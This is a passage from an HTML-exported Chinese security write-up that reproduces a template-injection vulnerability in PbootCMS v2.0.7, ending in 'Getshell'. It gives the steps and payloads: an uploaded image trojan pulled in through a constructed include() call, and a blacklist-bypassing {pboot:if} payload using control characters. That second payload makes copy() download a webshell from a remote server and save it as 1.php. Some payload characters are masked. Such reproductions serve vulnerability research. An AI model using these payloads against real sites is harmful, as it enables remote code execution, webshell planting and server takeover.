class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csFE4DF89B"><span class="cs9C1B1871">上传图片马</span></li></ol>
		<p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image6.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">得到路径</span><span class="cs9FB05234">static/upload/image/20200417/1587111957160139.png</span></li><li class="cs63189908"><span class="cs9C1B1871">根据路径构造</span><span class="cs8926E06">payload</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">include(s.tatic.array(__FILE__)[0][0].upload.array(__FILE__)[0][0].image.array(__FILE__)[0][0].array(PAGE)[0][2].array(PAGE)[0][0].array(PAGE)[0][2].array(PAGE)[0][0].array(PAGE)[0][0].array(PAGE)[0][4].array(PAGE)[0][1].array(PAGE)[0][7].(</span><span class="cs7FFD2630">马赛克</span><span class="cs9FB05234">).png)</span></li><li class="cs24C36B3"><span class="cs9C1B1871">将</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">放入模板的</span><span class="cs9FB05234">if</span><span class="cs9C1B1871">语句中</span></li></ul>
		<ol start="3" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">模板注入</span></li></ol>
		<p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image0.jpg" width="560" height="228" alt="" style="border-width:0px;" /></span></p><ol start="4" style="margin-top:0;margin-bottom:0;">
			<li class="csFE4DF89B" value="4"><span class="cs9C1B1871">访问带有分页类且又能输出公司地址的地方</span></li></ol>
		<p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image7.png" width="560" height="233" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Getshell</span><span class="cs9C1B1871">成功！！！</span></p><h3 class="cs868C439D">
			<a name="补充"><span class="csD6CA00D2">补充</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">一开始在研究这个漏洞的时候，就觉得有点麻烦，又要上传图片马，又要构造图片马的路径，不能一个</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">直接打，十分麻烦。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">于是就跑去问了问</span><span class="cs8926E06">P</span><span class="cs9C1B1871">师傅</span><span class="cs8926E06">**</span><span class="cs9C1B1871">（</span><span class="cs8926E06">P</span><span class="cs9C1B1871">牛，永远滴神！）</span><span class="cs8926E06">**</span></p><p class="cs40DD2BC9"><span class="cs8926E06">P</span><span class="cs9C1B1871">师傅理解了我的需求后，直接甩了个</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">给我</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image8.png" width="560" height="329" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">看到后我才想起，以前就看过</span><span class="cs8926E06">P</span><span class="cs9C1B1871">师傅的一篇文章里面的一个</span><span class="cs8926E06">trick</span><span class="cs9C1B1871">：在一个函数的括号前面加入一些控制字符，</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">一样能识别改函数并执行。利用这个</span><span class="cs8926E06">trick</span><span class="cs9C1B1871">就可以执行任意函数了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">于是根据</span><span class="cs8926E06">P</span><span class="cs9C1B1871">师傅给的思路再结合程序本身的一些其他的黑名单限制，很快我就构造出了一个通用的</span><span class="cs8926E06">Payload</span></p><p class="cs3A447A38"><span class="cs9FB05234">{pboot%3aif(copy%01(chr%01(104).chr%01(116).chr%01(116).(</span><span class="cs7FFD2630">马赛克</span><span class="cs9FB05234">),chr%01(49).chr%01(46).chr%01(112).chr%01(104).chr%01(112)))}asdasdasd{/pboot%3aif}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用一个</span><span class="cs9FB05234">copy()</span><span class="cs9C1B1871">函数到远程服务器上下载一个</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">放在本地，这里的</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">地址通过</span><span class="cs9FB05234">chr()</span><span class="cs9C1B1871">函数一个个还原出</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">地址一个个拼接。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">向模板注入该</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image1.jpg" width="560" height="263" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问前台触发点：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image9.png" width="560" height="269" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">则会去</span><span class="cs9FB05234">http://mock.x.dnshia.cn/shell</span><span class="cs9C1B1871">下载</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">，并保存到</span><span class="cs9FB05234">1.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image10.png" width="560" height="321" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7628</span></p></body>
</html>
